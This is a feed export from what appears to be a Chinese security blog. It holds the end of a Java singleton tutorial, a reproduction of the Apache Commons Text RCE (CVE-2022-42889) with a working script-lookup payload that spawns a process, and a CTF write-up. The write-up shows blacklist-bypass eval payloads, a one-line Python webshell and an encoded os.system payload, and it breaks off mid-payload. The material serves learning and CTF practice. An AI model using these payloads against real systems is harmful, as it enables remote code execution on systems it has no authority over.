class-name">HungryManStyle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest6</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Singleton</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//双重检查  </span><span class="token keyword">class</span> <span class="token class-name">Singleton6</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">volatile</span> <span class="token class-name">Singleton6</span> instance<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">Singleton6</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">&#125;</span>        <span class="token comment">//提供一个静态的公有方法，加入双重检查代码，解决线程安全问题，同时解决懒加载问题  </span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token class-name">Singleton6</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">Singleton6</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> instance<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>Double-Check概念是多线程开发中常使用到的，如代码中所示，我们进行了两次 <code>if(singleton==null)</code> 检查，这样就可以保证线程安全了。</li><li>这样，实例化代码只用执行一次，后面再次访问时，判断 <code>if(singleton==null)</code>，直接 reeturn 实例化对象，也避免反复进行方法同步；</li><li>线程安全，延迟加载，效率较高；</li><li>结论：在实际开发中，推荐使用这种单例设计模式。</li></ul><h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><p><strong>代码演示：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">HungryManStyle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest7</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Singleton7</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton7</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Singleton7</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton7</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//静态内部类  </span><span class="token keyword">class</span> <span class="token class-name">Singleton7</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token class-name">Singleton7</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">&#125;</span>        <span class="token comment">//写一个静态内部类，该类中有一个静态属性Singleton  </span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> singleInstance <span class="token punctuation">&#123;</span>          <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Singleton7</span> <span class="token constant">INSTANCE</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token comment">//提供一个静态的公有方法，直接返回对象  </span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token class-name">Singleton7</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> singleInstance<span class="token punctuation">.</span><span class="token constant">INSTANCE</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>静态内部类方式在 Singleton 类被装载时并不会立即实例化，而是在需要实例化时，调用 getInstance方法，会装载 SingletonInstance 类，从而完成 Singleton 的实例化；</li><li>类的静态属性只会在第一次加载类的时候初始化，所以在这里，JVM 帮助我们保证了线程的安全性，在类进行初始化时，别的线程是无法进入的；</li><li>优点：避免了线程不安全，利用静态内部类特点实现延迟加载，效率高；</li><li>结论：推荐使用</li></ul><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p><strong>代码演示：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">HungryManStyle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest8</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Singleton8</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton8</span><span class="token punctuation">.</span><span class="token constant">INSTANCE</span><span class="token punctuation">;</span>          <span class="token class-name">Singleton8</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton8</span><span class="token punctuation">.</span><span class="token constant">INSTANCE</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>          instance<span class="token punctuation">.</span><span class="token function">sayOK</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//使用枚举，可以实现单例  </span><span class="token keyword">enum</span> <span class="token class-name">Singleton8</span> <span class="token punctuation">&#123;</span>      <span class="token constant">INSTANCE</span><span class="token punctuation">;</span><span class="token comment">//属性  </span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayOK</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>这借助了JDK1.5中添加的枚举来实现单例模式，不仅能避免多线程同步问题，而且还能防止反序列化重新创建新的对象；</li><li>结论：推荐使用</li></ul><h2 id="0x03-单例模式注意事项和细节说明"><a href="#0x03-单例模式注意事项和细节说明" class="headerlink" title="0x03 单例模式注意事项和细节说明"></a>0x03 单例模式注意事项和细节说明</h2><p>单例模式保证了系统内存中该类只存在一个对象，节省了系统资源，对于一些需要频繁创建销毁的对象，使用单例模式可以提高系统性能。</p><ul><li>当想实例化一个单例类的时候，必须要记住使用相应的获得对象的方法，而不是使用new；</li><li>单例模式使用场景：需要频繁的进行创建和销毁的对象、创建对象时耗时过多或耗费资源过多（即：重量级对象），但又经常用到的对象、工具类对象、频繁访问数据库或文件的对象（比如数据源、session工厂等）。</li></ul><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>最近真是有点懒劲犯了，还是得多多专注，不要犯懒癌。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java 设计模式之单例模式&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-42889 分析与 CodeQL</title>
    <link href="https://drun1baby.github.io/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/"/>
    <id>https://drun1baby.github.io/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/</id>
    <published>2023-05-23T10:51:35.000Z</published>
    <updated>2023-08-31T13:49:57.099Z</updated>
    
    <content type="html"><![CDATA[<p>复现 CVE-2022-42889 Apache Commons Text RCE 的同时，学习一下如何用 CodeQL 发掘 CVE-2023-22665 的洞</p><span id="more"></span><h1 id="CVE-2022-42889-Apache-Commons-Text-RCE-漏洞分析"><a href="#CVE-2022-42889-Apache-Commons-Text-RCE-漏洞分析" class="headerlink" title="CVE-2022-42889 Apache Commons Text RCE 漏洞分析"></a>CVE-2022-42889 Apache Commons Text RCE 漏洞分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>因为自己特别想学一学 CodeQL 这类东西，所以就有了这篇文章</p><h2 id="0x02-漏洞相关信息"><a href="#0x02-漏洞相关信息" class="headerlink" title="0x02 漏洞相关信息"></a>0x02 漏洞相关信息</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Commons Text 执行变量插值 (variable interpolation)， 允许动态评估和扩展属性。插值的标准格式是 <code>&quot;$&#123;prefix:name&#125;&quot;</code>，其中 “prefix” 用于查找定位执行插值 <code>org.apache.commons.text.lookup.StringLookup</code> 的实例。从 1.5 版到 1.9 版，默认的 Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。</p><ul><li>看到这个漏洞描述其实就是 JavaScriptEngine 没得跑了</li></ul><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>1.5 &lt;&#x3D; Apache Commons Text &lt;&#x3D; 1.9</p><h2 id="0x03-漏洞基础"><a href="#0x03-漏洞基础" class="headerlink" title="0x03 漏洞基础"></a>0x03 漏洞基础</h2><h3 id="Apache-Commons-Text"><a href="#Apache-Commons-Text" class="headerlink" title="Apache Commons Text"></a>Apache Commons Text</h3><p>Apache Commons Text 该组件是一款处理字符串和文本块的开源项目，简单来说，除了核心 Java 提供的功能外，Apache Commons 文本库还包含了许多有用的实用程序方法，用于处理字符串。通常在开发过程中用于占位符和动态获取属性的字符串编辑工具包，常用于数据库查询前的语句替换，或者页面输出时的替换。</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p><strong>pom.xml</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-漏洞复现与分析"><a href="#0x05-漏洞复现与分析" class="headerlink" title="0x05 漏洞复现与分析"></a>0x05 漏洞复现与分析</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>按照官方文档的说法，<a class="link"   href="https://commons.apache.org/proper/commons-text/userguide.html" >https://commons.apache.org/proper/commons-text/userguide.html<i class="fas fa-external-link-alt"></i></a></p><p>一个简单的 demo 使用应该如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">StringSubstitutor</span> interpolator <span class="token operator">=</span> <span class="token class-name">StringSubstitutor</span><span class="token punctuation">.</span><span class="token function">createInterpolator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">String</span> text <span class="token operator">=</span> interpolator<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>    <span class="token string">"Base64 Decoder:        $&#123;base64Decoder:SGVsbG9Xb3JsZCE=&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Base64 Encoder:        $&#123;base64Encoder:HelloWorld!&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Java Constant:         $&#123;const:java.awt.event.KeyEvent.VK_ESCAPE&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Date:                  $&#123;date:yyyy-MM-dd&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Environment Variable:  $&#123;env:USERNAME&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"File Content:          $&#123;file:UTF-8:src/test/resources/document.properties&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Java:                  $&#123;java:version&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Localhost:             $&#123;localhost:canonical-name&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Properties File:       $&#123;properties:src/test/resources/document.properties::mykey&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"Resource Bundle:       $&#123;resourceBundle:org.apache.commons.text.example.testResourceBundleLookup:mykey&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"System Property:       $&#123;sys:user.dir&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"URL Decoder:           $&#123;urlDecoder:Hello%20World%21&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"URL Encoder:           $&#123;urlEncoder:Hello World!&#125;\n"</span> <span class="token operator">+</span>    <span class="token string">"XML XPath:             $&#123;xml:src/test/resources/document.xml:/root/path/to/node&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据官方文档的说法，这里还支持一些其他关键字，比如 <code>dns</code>、<code>url</code>、<code>script</code>，对应的类是 <code>ScriptStringLookup</code>，进去看看</p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/ScriptStringLookup.png" class=""><p>其中比较明显地能够看出来该如何构造语句</p><p><strong>PoC</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>script<span class="token operator">:</span>js<span class="token operator">:</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结合整体</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">StringSubstitutor</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">StringSubstitutor</span> interpolator <span class="token operator">=</span> <span class="token class-name">StringSubstitutor</span><span class="token punctuation">.</span><span class="token function">createInterpolator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"$&#123;script:js:new java.lang.ProcessBuilder(\"calc\").start()&#125;"</span><span class="token punctuation">;</span>          interpolator<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/EXP.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;复现 CVE-2022-42889 Apache Commons Text RCE 的同时，学习一下如何用 CodeQL 发掘 CVE-2023-22665 的洞&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2023 AntCTF x D³CTF 复现</title>
    <link href="https://drun1baby.github.io/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://drun1baby.github.io/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-05-02T13:32:58.000Z</published>
    <updated>2023-05-05T02:14:22.175Z</updated>
    
    <content type="html"><![CDATA[<p>2023 AntCTF x D³CTF 复现，爆零太痛苦了</p><span id="more"></span><p>其实比赛的时候好几个都感觉是临门一脚，太难过了，和红名谷一样</p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>这个题目觉得是自己队伍想复杂了，且没有很好的进行调试，题目源代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">from</span> os <span class="token keyword">import</span> systemapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge_3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> cmd<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&lt;pre>import requests, base64exp = ''requests.post("", data=&#123;"cmd": base64.b64encode(exp.encode())&#125;).text&lt;/pre>"""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"bad base64"</span>    black_char <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span>        <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span>        <span class="token string">'except'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span> <span class="token string">'while'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">,</span>        <span class="token string">'with'</span><span class="token punctuation">,</span> <span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token string">'break'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'raise'</span><span class="token punctuation">,</span>        <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> black_char<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'failed: `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">`'</span></span>    msg <span class="token operator">=</span> <span class="token string">"success"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        msg <span class="token operator">=</span> <span class="token string">"error"</span>    <span class="token keyword">return</span> msg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说就是要过黑名单，其实在这里我们队伍最早思考到的 Payload 是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">raw_cmd <span class="token operator">=</span> <span class="token string">"\\x5f\\x5fim\\x70ort\\x5f\\x5f(\\x27os\\x27)\\x2esystem(\\x27ls\\x27)"</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'eval("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>raw_cmd<span class="token punctuation">&#125;</span></span><span class="token string">")'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是因为 eval 被过滤了，不能打，且十六进制编码当中，存在数字，当然数字这里我们也提出了绕过的方法，用 <code>abs(False-True) == 1</code> 的特性来构造。最后还是没构造出来，因为在十六进制转换当中需要替换这一串字符有些许难度，导致当时进度停滞。</p><p>后续看其他师傅的 wp 学到了 <strong>eval 可用 ｅval 来绕过</strong></p><p>我们可以通过以下命令构造一个 Request 请求</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">ｅval(repr(request)[abs(False-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True-True):-abs(False-True-True-True-True-True-True-True-True-True)])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以下可以命令执行</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import base64url&#x3D;&quot;http:&#x2F;&#x2F;139.196.153.118:31594&#x2F;&quot;def translate(x):    ret &#x3D; &quot;abs(False&quot;    for i in range(x):        ret +&#x3D; &quot;-True&quot;    ret+&#x3D;&quot;)&quot;    return rett &#x3D; translate(len(&quot;&lt;Request &#39;&quot;+url+&quot;?1&#x3D;&quot;))code &#x3D; &#39;&#39;&#39;ｅval(repr(request)[&#123;&#125;:-abs(False-True-True-True-True-True-True-True-True-True)])&#39;&#39;&#39;.format(t)enres &#x3D; base64.b64encode(code.encode()).decode()print(enres)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是队内 lx56 师傅的思路，相当于是写了一个 Python 的一句话木马</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">http:&#x2F;&#x2F;139.196.153.118:31594&#x2F;?1&#x3D;eval(list(request.form).pop(1))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">cmd&#x3D;772FdmFsKHJlcHIocmVxdWVzdClbYWJzKEZhbHNlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlKTotYWJzKEZhbHNlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlKV0p&amp;__import__(&#39;os&#39;).system(&#39;&#39;)&#x3D;1111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/escapePayload.png" class=""><p>curl 用不了但 nc 可用，先暂存 flag</p><pre class="line-numbers language-payload" data-language="payload"><code 